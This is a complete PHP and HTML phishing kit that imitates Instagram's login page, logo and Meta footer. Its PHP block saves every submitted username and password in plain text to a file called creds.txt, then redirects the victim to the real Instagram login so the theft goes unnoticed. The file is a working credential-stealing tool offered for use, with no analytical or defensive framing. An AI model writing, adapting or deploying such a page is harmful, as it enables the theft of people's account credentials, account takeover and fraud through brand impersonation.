<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username && $password) {
        $data = "Username: $username | Password: $password\n";
        file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
        header('Location: https://www.instagram.com/accounts/login/');
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en" style="background:#fafafa; font-family: Arial, sans-serif;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .logo {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            margin: 6px 0;
            padding: 9px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            color: white;
            padding: 8px 0;
            margin: 12px 0 8px;
            font-weight: 600;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007dc1;
        }
        a {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }
        .footer {
            margin-top: 30px;
            font-size: 14px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" width="180">
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username" />
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password" />
            <button type="submit">Log In</button>
        </form>
        <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        <div class="footer">© 2025 Instagram from Meta</div>
    </div>
</body>
</html>
